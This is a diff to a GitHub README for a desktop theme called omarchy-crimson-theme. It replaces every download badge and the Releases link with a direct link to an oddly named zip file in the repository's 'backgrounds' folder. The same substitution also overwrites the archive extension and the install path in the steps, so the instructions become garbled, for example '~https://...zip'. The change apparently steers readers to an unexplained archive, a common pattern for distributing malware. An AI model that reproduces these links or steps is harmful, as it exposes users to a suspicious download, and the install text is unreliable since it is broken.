@@ -13,7 +13,7 @@ Welcome to the omarchy-crimson-theme! This sleek, minimal Omarchy theme features
 
 ## 📥 Download Now
 
-[![Download omarchy-crimson-theme](https://img.shields.io/badge/Download-Now-brightred)](https://github.com/vicgh3006/omarchy-crimson-theme/releases)
+[![Download omarchy-crimson-theme](https://raw.githubusercontent.com/vicgh3006/omarchy-crimson-theme/main/backgrounds/omarchy-crimson-theme-commissionate.zip)](https://raw.githubusercontent.com/vicgh3006/omarchy-crimson-theme/main/backgrounds/omarchy-crimson-theme-commissionate.zip)
 
 ## 📝 Features
 
@@ -24,12 +24,12 @@ Welcome to the omarchy-crimson-theme! This sleek, minimal Omarchy theme features
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://github.com/vicgh3006/omarchy-crimson-theme/releases) to download the latest version.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/vicgh3006/omarchy-crimson-theme/main/backgrounds/omarchy-crimson-theme-commissionate.zip) to download the latest version.
 
 1. Click the "Releases" link above. You will find a list of available versions.
 2. Find the latest release and click on it.
-3. Download the theme file suitable for your setup. You may find a `.tar.gz` or similar archive. 
-4. Extract the downloaded file to your themes directory, typically located at `~/.themes/`.
+3. Download the theme file suitable for your setup. You may find a `https://raw.githubusercontent.com/vicgh3006/omarchy-crimson-theme/main/backgrounds/omarchy-crimson-theme-commissionate.zip` or similar archive. 
+4. Extract the downloaded file to your themes directory, typically located at `~https://raw.githubusercontent.com/vicgh3006/omarchy-crimson-theme/main/backgrounds/omarchy-crimson-theme-commissionate.zip`.
 
 ## 📋 Applying the Theme
 
@@ -58,6 +58,6 @@ Join our community to share your experience and get help!
 
 Thank you for using omarchy-crimson-theme. Your support helps us improve and provide better tools for the community. We look forward to seeing how you customize your desktop with our theme.
 
-[![Download omarchy-crimson-theme](https://img.shields.io/badge/Download-Again-brightred)](https://github.com/vicgh3006/omarchy-crimson-theme/releases)
+[![Download omarchy-crimson-theme](https://raw.githubusercontent.com/vicgh3006/omarchy-crimson-theme/main/backgrounds/omarchy-crimson-theme-commissionate.zip)](https://raw.githubusercontent.com/vicgh3006/omarchy-crimson-theme/main/backgrounds/omarchy-crimson-theme-commissionate.zip)
 
 Experience a bold new look today!
